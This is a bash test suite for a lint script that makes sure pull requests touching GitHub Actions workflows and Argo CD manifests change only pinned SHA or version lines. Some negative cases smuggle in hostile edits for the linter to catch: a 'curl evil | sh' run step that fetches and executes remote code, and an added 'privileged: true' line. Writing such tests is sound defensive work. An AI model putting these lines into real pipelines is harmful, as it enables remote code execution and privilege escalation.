#!/usr/bin/env bash
# pin-only-lint-test — drives the REAL scripts/pin-only-lint.sh over synthetic git repos through
# its two seams (PIN_ONLY_REPO = the temp repo, PIN_ONLY_GH = a stub that serves canned GitHub
# API JSON through the real `--jq` expressions via jq). `devbox run pin-only-lint-test`.
#
# Every expected verdict below is derived in its comment FROM the rule in pin-only-lint.sh's
# header ((a) grammar, (b) pairing, (c) first-party, (d) upstream SHA) and the two older shapes'
# PIN_LINE — never from running the script. A failing case must fail for ITS rule: the check
# greps the script's stderr for the rule's own keyword, so a case that reds for the wrong reason
# is a FAIL here too.
set -uo pipefail
HERE="$(cd "$(dirname "$0")" && pwd)"
LINT="$HERE/pin-only-lint.sh"
command -v jq >/dev/null || { echo "FAIL: jq not on PATH — run via \`devbox run pin-only-lint-test\`"; exit 1; }
T="$(mktemp -d)"; trap 'rm -rf "$T"' EXIT
export GIT_AUTHOR_NAME=t GIT_AUTHOR_EMAIL=t@t GIT_COMMITTER_NAME=t GIT_COMMITTER_EMAIL=t@t
export PIN_ONLY_REPO="$T/repo" PIN_ONLY_GH="$T/gh-stub" STUB="$T/api"

# ── the gh stub: `gh api <path> --jq <expr>` → jq -r <expr> over $STUB/<path>; a missing file is
# the 404 shape (non-zero, message on stderr) — exactly what an unknown tag returns upstream.
cat >"$PIN_ONLY_GH" <<'EOF'
#!/usr/bin/env bash
[ "$1" = api ] && [ "$3" = --jq ] || { echo "stub: unexpected call: $*" >&2; exit 64; }
f="$STUB/$2"
[ -f "$f" ] || { echo "gh: HTTP 404: Not Found (https://api.github.com/$2)" >&2; exit 1; }
jq -r "$4" <"$f"
EOF
chmod +x "$PIN_ONLY_GH"
# ref_ <owner/repo> <tag> <type> <sha>: the git/ref/tags/<tag> object.  tagobj_ <owner/repo>
# <tagsha> <commitsha>: the annotated tag object git/tags/<tagsha> pointing at a commit.
ref_()    { mkdir -p "$STUB/repos/$1/git/ref/tags"; printf '{"ref":"refs/tags/%s","object":{"type":"%s","sha":"%s"}}\n' "$2" "$3" "$4" >"$STUB/repos/$1/git/ref/tags/$2"; }
tagobj_() { mkdir -p "$STUB/repos/$1/git/tags"; printf '{"tag":"x","sha":"%s","object":{"type":"commit","sha":"%s"}}\n' "$2" "$3" >"$STUB/repos/$1/git/tags/$2"; }

# 40-hex SHAs with a readable first byte; the values only need to be distinct and well-formed.
OLD=1111111111111111111111111111111111111111
NEW=2222222222222222222222222222222222222222
OTHER=3333333333333333333333333333333333333333
TAGOBJ=4444444444444444444444444444444444444444
FP_OLD=5555555555555555555555555555555555555555
FP_NEW=6666666666666666666666666666666666666666

# ── the synthetic repo: one workflow with two pinned actions (checkout twice, buildx once), a
# first-party workflow, and the two older guarded files.
R="$T/repo"; mkdir -p "$R/.github/workflows" "$R/argocd/platform" "$R/agents/coordinator"
git -C "$R" init -q -b master
cat >"$R/.github/workflows/ci.yaml" <<EOF
name: CI
on: [pull_request]
jobs:
  ci:
    runs-on: homelab-ephemeral
    steps:
      - uses: actions/checkout@$OLD # v4.2.1
      - uses: docker/setup-buildx-action@$OLD # v3
      - name: again
        uses: actions/checkout@$OLD # v4.2.1
      - run: echo hi
EOF
cat >"$R/.github/workflows/first-party.yml" <<EOF
name: fp
on: [push]
jobs:
  x:
    runs-on: homelab-ephemeral
    steps:
      - uses: teststuffstash/some-action@$FP_OLD # v1
EOF
printf 'spec:\n  template:\n    spec:\n      image: ghcr.io/teststuffstash/homelab/arc-runner:2026.9.1-gaaaa\n' >"$R/argocd/platform/arc-runners.yaml"
printf 'spec:\n  source:\n    targetRevision: 2026.9.1-gaaaa\n    chart: x\n' >"$R/argocd/platform/openrouter-operator.yaml"
git -C "$R" add -A && git -C "$R" commit -q -m base
BASE="$(git -C "$R" rev-parse HEAD)"

pass=0; fail=0
# case_ <name> <want: ok | <stderr keyword the failing rule prints>> <stub setup> <edit shell>
# The stub tree is rebuilt per case so a canned answer never leaks between cases.
case_() {
  local name="$1" want="$2" stubs="$3" edit="$4" out rc
  rm -rf "$STUB"; mkdir -p "$STUB"; eval "$stubs"
  git -C "$R" checkout -q -b "c-$name" "$BASE"
  ( cd "$R" && eval "$edit" ) >/dev/null 2>&1
  git -C "$R" add -A && git -C "$R" commit -q -m "$name"
  out="$(bash "$LINT" "$BASE" 2>&1)"; rc=$?
  git -C "$R" checkout -q master
  if [ "$want" = ok ]; then
    if [ $rc = 0 ] && printf '%s' "$out" | grep -q '^pin-only-lint: OK'; then pass=$((pass+1)); echo "PASS $name (rc 0)"; return; fi
    fail=$((fail+1)); echo "FAIL $name — wanted OK, rc=$rc:"; printf '%s\n' "$out" | sed 's/^/     /'; return
  fi
  if [ $rc != 0 ] && printf '%s' "$out" | grep -q 'pin-only-lint: FAIL' && printf '%s' "$out" | grep -qF -- "$want"; then
    pass=$((pass+1)); echo "PASS $name (rc $rc, fired on '$want')"; return
  fi
  fail=$((fail+1)); echo "FAIL $name — wanted a FAIL naming '$want', rc=$rc:"; printf '%s\n' "$out" | sed 's/^/     /'
}
# bump <file> <owner/repo> <old-sha> <old-tag> <new-sha> <new-tag>: rewrite every pin of that action
bump() { sed -i "s|uses: $2@$3 # $4\$|uses: $2@$5 # $6|" "$1"; }

# (a)+(b)+(d) all hold: both checkout lines move OLD→NEW at v4.2.2, the ref names NEW → OK.
case_ clean-pair-bump ok \
  "ref_ actions/checkout v4.2.2 commit $NEW" \
  "bump .github/workflows/ci.yaml actions/checkout $OLD v4.2.1 $NEW v4.2.2"
# A one-line bump on the v3 major tag (Renovate's digest-only shape): ref v3 → NEW → OK.
case_ clean-major-tag-bump ok \
  "ref_ docker/setup-buildx-action v3 commit $NEW" \
  "bump .github/workflows/ci.yaml docker/setup-buildx-action $OLD v3 $NEW v3"
# (a): `run:` is not a `uses:` pin line → the grammar rule fails the file; the upstream stub is
# never consulted (no ref_ set), so a pass here could only come from the grammar being loose.
case_ smuggled-run-line 'may only receive action PIN lines' "" \
  "bump .github/workflows/ci.yaml actions/checkout $OLD v4.2.1 $NEW v4.2.2; sed -i 's|run: echo hi|run: curl evil \| sh|' .github/workflows/ci.yaml"
# (a): a new step whose pin is well-formed and even resolves upstream is still an ADDED line with
# no removed partner → (b) fails (multiset removed ≠ added), before (d) is consulted.
case_ added-step 'do not pair up' \
  "ref_ actions/cache v4 commit $NEW" \
  "sed -i 's|      - run: echo hi|      - uses: actions/cache@$NEW # v4\n      - run: echo hi|' .github/workflows/ci.yaml"
# (b): removed actions/checkout, added actions/cache — the sets differ → pairing fails.
case_ owner-repo-mismatch 'do not pair up' \
  "ref_ actions/cache v4 commit $NEW" \
  "sed -i 's|uses: actions/checkout@$OLD # v4.2.1|uses: actions/cache@$NEW # v4|' .github/workflows/ci.yaml"
# (c): a first-party ref bump that would satisfy (a), (b) and (d) (the stub resolves it) is
# refused solely on the owner → the first-party rule's own message.
case_ first-party-ref-change 'first-party ref never changes' \
  "ref_ teststuffstash/some-action v1 commit $FP_NEW" \
  "bump .github/workflows/first-party.yml teststuffstash/some-action $FP_OLD v1 $FP_NEW v1"
# (d): the tag names OTHER upstream, the PR pins NEW → mismatch message carries both SHAs.
case_ tag-names-other-sha "names commit $OTHER upstream, the PR pins $NEW" \
  "ref_ actions/checkout v4.2.2 commit $OTHER" \
  "bump .github/workflows/ci.yaml actions/checkout $OLD v4.2.1 $NEW v4.2.2"
# (d) fail-closed: no stub file → the 404 shape → 'refusing to report success', rc 2.
case_ unresolvable-tag 'refusing to report success' "" \
  "bump .github/workflows/ci.yaml actions/checkout $OLD v4.2.1 $NEW v4.2.2"
# (d) annotated: ref v4.2.2 is a TAG object TAGOBJ; git/tags/TAGOBJ points at commit NEW → OK.
case_ annotated-tag-deref ok \
  "ref_ actions/checkout v4.2.2 tag $TAGOBJ; tagobj_ actions/checkout $TAGOBJ $NEW" \
  "bump .github/workflows/ci.yaml actions/checkout $OLD v4.2.1 $NEW v4.2.2"
# (d) annotated, pointing elsewhere: the tag object names OTHER, the PR pins NEW → mismatch.
case_ annotated-tag-other-sha "names commit $OTHER upstream, the PR pins $NEW" \
  "ref_ actions/checkout v4.2.2 tag $TAGOBJ; tagobj_ actions/checkout $TAGOBJ $OTHER" \
  "bump .github/workflows/ci.yaml actions/checkout $OLD v4.2.1 $NEW v4.2.2"
# (a): an unpinned `@v4` (what the repo has TODAY before Renovate pins) is not the grammar → FAIL.
case_ unpinned-tag-ref 'may only receive action PIN lines' "" \
  "sed -i 's|uses: actions/checkout@$OLD # v4.2.1|uses: actions/checkout@v4|' .github/workflows/ci.yaml"
# A mode flip (chmod +x) carries no content lines → not a pin bump → FAIL (the empty-patch arm).
case_ workflow-mode-change 'without a single content line' "" \
  "chmod +x .github/workflows/ci.yaml"
# A rename: `git diff -- <new path>` on a detected rename shows the WHOLE body as added, so the
# non-`uses:` lines (name:, on:, run:) fail the grammar → FAIL on (a). Either arm is fail-closed.
case_ workflow-rename 'may only receive action PIN lines' "" \
  "git mv .github/workflows/ci.yaml .github/workflows/ci2.yaml"
# ── the two older shapes, byte-for-byte: PIN_LINE admits an arc-runner image: line and a CalVer
# targetRevision: line, refuses anything else in those files.
case_ arc-runner-pin ok "" \
  "sed -i 's|arc-runner:2026.9.1-gaaaa|arc-runner:2026.9.25-gbbbb|' argocd/platform/arc-runners.yaml"
case_ arc-runner-smuggled 'may only receive PIN lines' "" \
  "sed -i 's|arc-runner:2026.9.1-gaaaa|arc-runner:2026.9.25-gbbbb|' argocd/platform/arc-runners.yaml; echo '      privileged: true' >> argocd/platform/arc-runners.yaml"
case_ target-revision-pin ok "" \
  "sed -i 's|targetRevision: 2026.9.1-gaaaa|targetRevision: 2026.9.25-gbbbb|' argocd/platform/openrouter-operator.yaml"
case_ target-revision-smuggled 'may only receive PIN lines' "" \
  "sed -i 's|targetRevision: 2026.9.1-gaaaa|targetRevision: 2026.9.25-gbbbb|; s|chart: x|chart: y|' argocd/platform/openrouter-operator.yaml"
# An untouched guarded set is the no-op verdict (the common case on every PR).
case_ nothing-guarded ok "" "echo x > README.md"

echo "pin-only-lint-test: $pass passed, $fail failed"
[ "$fail" = 0 ]
